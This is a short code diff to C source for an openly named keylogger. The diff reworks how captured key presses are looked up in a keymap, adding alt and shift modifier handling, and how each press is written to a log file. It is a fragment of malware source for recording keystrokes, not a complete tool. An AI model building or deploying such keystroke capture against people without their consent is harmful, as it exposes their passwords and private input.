@@ -22,12 +22,14 @@ void    SIGhandler(int signal)
 
 void	selectKey(t_keylogger *klg)
 {
+	int mod;
+
+	mod = 0;
+	if (klg->mod.alt || klg->mod.mod)
+		mod += 4;
 	if (klg->mod.shift)
-	{
-		dprintf(klg->saveFD, "Key: %i State: %i, desc: %s\n",klg->event.code, klg->event.value, klg->keymap[klg->event.code -1][1]);
-		return ;
-	}
-	dprintf(klg->saveFD, "Key: %i State: %i, desc: %s\n",klg->event.code, klg->event.value, klg->keymap[klg->event.code -1][0]);
+		mod += 1;
+	dprintf(klg->saveFD, "Key: %i State: %i, desc: %s\n",klg->event.code, klg->event.value, klg->keymap[klg->event.code -1][mod]);
 	return ;
 }
 void	recording(t_keylogger *klg)
@@ -36,9 +38,8 @@ void	recording(t_keylogger *klg)
 	{
 		if(klg->event.type == EV_KEY && is_mod_key(klg) == FALSE)
 		{
-			if(klg->event.value == 1){
+			if(klg->event.value == 1)
 				selectKey(klg);
-			}
 		}
 
 	}
